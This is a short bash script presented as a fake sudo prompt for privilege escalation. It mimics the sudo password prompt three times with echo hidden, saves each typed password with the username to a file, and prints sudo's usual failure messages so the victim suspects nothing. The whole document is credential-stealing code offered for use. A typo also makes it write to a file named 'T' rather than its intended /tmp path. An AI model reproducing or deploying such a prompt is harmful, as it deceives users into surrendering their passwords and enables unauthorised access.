#!/bin/bash
#
#  Author: Spacecow
#  Date: 19/10/2014
#  Description:
#  A quick fake sudo prompt for quick priv escalation.
#  Could it use improving? Yes... yes it can.

TARGET="/tmp/$(whoami)-psudo"

if [ ! -f ${TARGET} ]; then
  for n in 1 2 3; do
    echo -n "Password:"
    stty -echo
    read password
    stty echo
    echo ""
    echo "$(whoami):${password}" >> ${TARGE}T
    sleep 1
    echo "Sorry, try again." 1>&2
  done
  echo "sudo: 3 incorrect password attempts"
fi

exit 1
